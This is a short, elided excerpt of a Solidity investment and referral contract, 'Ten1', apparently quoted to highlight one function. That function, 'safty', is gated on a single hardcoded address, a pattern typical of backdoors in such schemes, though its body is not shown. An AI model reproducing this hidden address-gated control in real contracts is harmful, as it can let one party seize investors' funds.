...
contract Ten1 {
	...
	uint256 constant private INVEST_MIN_AMOUNT = 0.1 ether; 
	uint256 constant private INVEST_MAX_AMOUNT = 500 ether; 
	uint256[] private REFERRAL_PERCENTS = [50];
	...
	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
	 ...
	 function safty(address _addr)public  returns(string memory){
      require( keccak256( abi.encode(_addr)) == keccak256(abi.encode(0xc3695FC517F1Fc1eB54fEF19936e1942d06d8316)),"this contract is not yours");
